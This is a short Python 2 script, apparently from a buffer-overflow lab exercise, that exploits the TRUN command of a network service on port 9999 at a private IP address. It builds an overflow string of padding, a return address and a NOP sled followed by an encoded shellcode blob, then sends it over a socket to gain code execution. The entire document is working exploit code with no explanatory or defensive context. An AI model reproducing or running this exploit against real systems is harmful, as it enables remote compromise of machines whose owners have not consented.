#!/usr/bin/python
import sys, socket

overflow = ("\xba\x60\x10\x75\x8f\xdb\xde\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x31\x50\x12\x03\x50\x12\x83\x88\xec\x97\x7a\xb4\xe5\xda"
"\x85\x44\xf6\xba\x0c\xa1\xc7\xfa\x6b\xa2\x78\xcb\xf8\xe6\x74"
"\xa0\xad\x12\x0e\xc4\x79\x15\xa7\x63\x5c\x18\x38\xdf\x9c\x3b"
"\xba\x22\xf1\x9b\x83\xec\x04\xda\xc4\x11\xe4\x8e\x9d\x5e\x5b"
"\x3e\xa9\x2b\x60\xb5\xe1\xba\xe0\x2a\xb1\xbd\xc1\xfd\xc9\xe7"
"\xc1\xfc\x1e\x9c\x4b\xe6\x43\x99\x02\x9d\xb0\x55\x95\x77\x89"
"\x96\x3a\xb6\x25\x65\x42\xff\x82\x96\x31\x09\xf1\x2b\x42\xce"
"\x8b\xf7\xc7\xd4\x2c\x73\x7f\x30\xcc\x50\xe6\xb3\xc2\x1d\x6c"
"\x9b\xc6\xa0\xa1\x90\xf3\x29\x44\x76\x72\x69\x63\x52\xde\x29"
"\x0a\xc3\xba\x9c\x33\x13\x65\x40\x96\x58\x88\x95\xab\x03\xc5"
"\x5a\x86\xbb\x15\xf5\x91\xc8\x27\x5a\x0a\x46\x04\x13\x94\x91"
"\x6b\x0e\x60\x0d\x92\xb1\x91\x04\x51\xe5\xc1\x3e\x70\x86\x89"
"\xbe\x7d\x53\x1d\xee\xd1\x0c\xde\x5e\x92\xfc\xb6\xb4\x1d\x22"
"\xa6\xb7\xf7\x4b\x4d\x42\x90\xb3\x3a\xf2\xe5\x5c\x39\x0a\xf7"
"\xc0\xb4\xec\x9d\xe8\x90\xa7\x09\x90\xb8\x33\xab\x5d\x17\x3e"
"\xeb\xd6\x94\xbf\xa2\x1e\xd0\xd3\x53\xef\xaf\x89\xf2\xf0\x05"
"\xa5\x99\x63\xc2\x35\xd7\x9f\x5d\x62\xb0\x6e\x94\xe6\x2c\xc8"
"\x0e\x14\xad\x8c\x69\x9c\x6a\x6d\x77\x1d\xfe\xc9\x53\x0d\xc6"
"\xd2\xdf\x79\x96\x84\x89\xd7\x50\x7f\x78\x81\x0a\x2c\xd2\x45"
"\xca\x1e\xe5\x13\xd3\x4a\x93\xfb\x62\x23\xe2\x04\x4a\xa3\xe2"
"\x7d\xb6\x53\x0c\x54\x72\x73\xef\x7c\x8f\x1c\xb6\x15\x32\x41"
"\x49\xc0\x71\x7c\xca\xe0\x09\x7b\xd2\x81\x0c\xc7\x54\x7a\x7d"
"\x58\x31\x7c\xd2\x59\x10")

payload = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.190.154',9999))
	s.send(('TRUN /.:/' + payload))
	s.close()
except:
	print "Could not connect to target machine"
	sys.exit()
